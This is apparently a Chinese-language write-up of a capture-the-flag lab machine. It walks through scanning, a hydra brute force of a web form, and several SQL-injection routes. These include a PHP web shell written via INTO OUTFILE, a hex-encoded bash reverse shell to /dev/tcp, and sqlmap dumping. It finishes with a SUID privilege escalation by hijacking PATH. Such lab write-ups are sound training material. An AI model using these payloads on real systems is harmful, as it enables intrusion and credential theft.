# 靶机描述



## 侦察和信息收集

`nmap -sN 192.168.0/`24 扫描主机C段，发现存活主机，确定`192.168.56.101`为目标靶机24

### nmap 扫描

TCP全端口扫描，80,111,777,60441 端口开放，并对对应端口进行服务扫描及操作系统探测，情况如下

![[Pasted image 20250602232119.png]]

UDP 全端口扫描，111，5353，33770 端口开放

![[Pasted image 20250602231606.png]]


## Web 渗透

对80端口访问，未发现有用信息，dirsearch 进行目录扫描

![[Pasted image 20250602234016.png]]

phpadmin试了一下常用账号密码，没用，漏洞库搜索了一下apache 2.4.10未发现有用信息，在这个地方卡住了，看了下题解，提示藏在开始的gif图片里，保存到本地，用  exiftool 查看图片信息，得到一串可以字符，作为url路径拼接访问，拿到一个新页面

![[Pasted image 20250603000158.png]]

![[Pasted image 20250603000357.png]]

## Hydra 密码爆破
注释提示，未连接数据库，密码不复杂，hydra构造post请求 爆破
``hydra -l "" -P /usr/share/wordlists/rockyou.txt 192.168.56.101 http-post-form "/kzMb5nVYJw/index.php:key=^PASS^:invalid key"``
得到密码 `elite`
![[Pasted image 20250603023243.png]]


## SQL注入大赏

### 方法一：手工注入之联合查询

输入`“` 报错，” --+ 注释，回显正常，判断闭合方式为 “ ”
![[Pasted image 20250603011733.png]]

order by 判断有3列，3个回显位均可回显
![[Pasted image 20250603011930.png]]

数据库信息如下
![[Pasted image 20250603012039.png]]

![[Pasted image 20250603012532.png]]

user pass 字段如下
![[Pasted image 20250603012417.png]]

`ramses:YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE`

密码 base64解密 得到 `c6d6bd7ebf806f43c76acc3681703b81` 像是hash，用hash-identifier识别 可能为md5,在线解密得到值为 `omega` 故
user : ranses
passwd : omega
777端口开放着SSL服务，尝试登陆下，登录成功，获得系统立足点

![[Pasted image 20250603013702.png]]


### 方法二：SQL注入写入一句话木马

之前目录扫描时候发现有一个 uploads 目录，可以尝试下这个数据库是否具有可写权限(root@localhost)

写入成功

![[Pasted image 20250603112544.png]]

![[Pasted image 20250603111754.png]]

但发现将2，3占位符也写入了进去，我们将 其置为空，重新写入

``union select "<?php system($_GET['cmd']); ?>",'','' INTO OUTFILE '/var/www/html/uploads/shell.php'--+``

传参访问，执行成功
![[Pasted image 20250603112636.png]]

我们的SQL语句查询，通过 420search.php 完成，查看下其内容，发现数据库账户及密码，登录phpmyadmin

![[Pasted image 20250603112953.png]]

发现加密的密码，及用户名，可尝试 ssh 登录

![[Pasted image 20250603113303.png]]

### 方法三：SQL注入写入反弹 sehll


16进制编码 避免复杂引号嵌套引发语法问题

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.56.102/9999 0>&1'"); ?>
--> HEX
0x3c3f706870206578656328222f62696e2f62617368202d63202762617368202d69203e26202f6465762f7463702f3139322e3136382e35362e3130322f3939393920303e26312722293b203f3e

```


![[Pasted image 20250603125218.png]]

成功拿到数据库账号密码

![[Pasted image 20250603125040.png]]

### 方法四：SQLmap一把梭

```bash
sqlmap -u "http://192.168.56.101/kzMb5nVYJw/420search.php?usrtosearch=" -dump

```

![[Pasted image 20250603130038.png]]


## 提权

find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null    并没有发现常见可利用的SUID提权
![[Pasted image 20250603020246.png]]

history 查看历史命令
![[Pasted image 20250603020347.png]]

其进入web目录下的backup,并运行了./procwatch ，ls -l 查看目录文件属性，发现procwatch具有SUID属性，运行后发现他执行了两个命令
![[Pasted image 20250603020601.png]]

使用软连接 连接到 ps上 `ln -s /bin/sh ps`
并将当前目录加到环境变量前 `export PATH=.:$PATH`
再运行二进制文件 `./procwatch`
提权成功
![[Pasted image 20250603020833.png]]

# 总结与思考

这台靶机比较有收获的是`SQL注入写马` `通过查看历史命令和筛选具有s权限的文件,创建软链接+修改环境变量提权`，提交SQL查询的 php 页面可能查找 s 权限文件，可以直接用下面的 find 命令进行查找：

```bash
find / -perm -u=s -type f 2>/dev/null
```

打靶全过程：

```TXT
1. 主机发现与端口扫描，聚焦80端口 web 服务，777端口有ssl
2. web 渗透，gif 图片藏有字符串 kzMb5nVYJw ，经过尝试发现是 web 路径，拼接访问进去后有一个文本框需要输入 key 值
3. hydra 对 post 表单进行爆破，拿到 key 值 elite
4. 进去后是一个用户名查询页面，存在SQL注入，闭合方式是 ""，可通过四种方式注入，拿到 SSH 登录凭证
5. ssh登录后，查找 s 权限文件，存在一个 /www/var/www/backup/procwatch 文件，但当时并没有引起注意，History 查看历史记录，再次出现这个文件，聚焦后，通过软连接+修改环境变量的方式对ps指令进行了劫持，运行procwatch触发提权
```

打靶过程中卡住的点;
1. web 目录扫描没有突破口时候，没有注意到图片，图片中也可能隐藏信息
2. ssh 登录后，查看s权限文件，过于聚焦像 which, bash,这种，没找到就卡住了，通过历史记录才再次找到突破口，


